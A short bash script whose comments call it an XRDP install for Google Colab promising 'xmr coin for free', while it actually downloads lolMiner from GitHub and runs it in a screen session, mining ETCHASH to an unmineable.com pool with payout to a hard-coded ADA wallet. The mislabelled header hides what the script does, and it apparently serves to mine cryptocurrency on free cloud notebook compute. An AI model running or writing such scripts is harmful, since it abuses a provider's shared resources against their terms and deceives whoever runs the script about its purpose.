#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R lolMiner
 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.58/lolMiner_v1.58_Lin64.tar.gz
tar xvzf lolMiner_v1.58_Lin64.tar.gz
cd 1.58
./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash-eu.unmineable.com:3333 --user ADA:DdzFFzCqrht9EZYJ27QKUjA1wb6SgSxChvDceZnX2WynAY4jUdPwoobzUncd8CuYj1Jg2sXQjLA3kxx4a3s3926amncganR9NyHJXcew.unmineable_worker_bbngdftn  
